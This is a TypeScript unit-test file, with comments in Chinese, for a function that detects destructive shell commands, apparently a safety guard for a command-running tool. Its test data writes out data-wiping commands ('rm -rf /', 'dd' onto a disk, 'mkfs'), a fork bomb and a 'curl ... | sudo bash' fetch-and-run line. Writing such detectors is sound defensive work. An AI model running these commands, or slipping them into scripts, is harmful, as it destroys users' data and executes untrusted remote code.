import { test } from "node:test";
import assert from "node:assert/strict";
import { isDestructiveCommand, DANGEROUS_PATTERNS, CATASTROPHIC_PATTERNS } from "../src/dangerous";

test("isDestructiveCommand: 命中灾难性命令", () => {
  const hits = [
    "rm -rf /",
    "sudo rm -rf /etc",
    "git reset --hard HEAD",
    "git push --force origin main",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1",
    "shutdown -h now",
    "curl -s http://x.sh | sudo bash",
    ":(){ :|:& };:",
  ];
  for (const cmd of hits) {
    assert.equal(isDestructiveCommand(cmd), true, `应命中：${cmd}`);
  }
});

test("isDestructiveCommand: Windows 盘符格式化命中", () => {
  assert.equal(isDestructiveCommand("format c:"), true);
  assert.equal(isDestructiveCommand("format D:"), true);
  // 带参数写法（format /y a:）不在 off 档清单内，属预期不拦截（L2 会拦）
  assert.equal(isDestructiveCommand("format /y a:"), false);
});

test("isDestructiveCommand: 合法命令不误伤", () => {
  assert.equal(isDestructiveCommand("echo hello"), false);
  assert.equal(isDestructiveCommand("npm run build"), false);
  assert.equal(isDestructiveCommand("git status"), false);
  assert.equal(isDestructiveCommand("rm -rf ./node_modules && npm install"), false);
  assert.equal(isDestructiveCommand("ls -la"), false);
  assert.equal(isDestructiveCommand("cat package.json"), false);
});

test("isDestructiveCommand: 大小写不敏感（off 档统一小写匹配）", () => {
  assert.equal(isDestructiveCommand("RM -RF /"), true);
  assert.equal(isDestructiveCommand("Git Reset --Hard HEAD"), true);
});

test("DANGEROUS_PATTERNS / CATASTROPHIC_PATTERNS: 非空清单且可编译", () => {
  assert.ok(DANGEROUS_PATTERNS.length > 0);
  assert.ok(CATASTROPHIC_PATTERNS.length > 0);
  for (const re of [...DANGEROUS_PATTERNS, ...CATASTROPHIC_PATTERNS]) {
    assert.ok(re instanceof RegExp);
    re.test("安全命令 echo hi"); // 不抛异常
  }
});
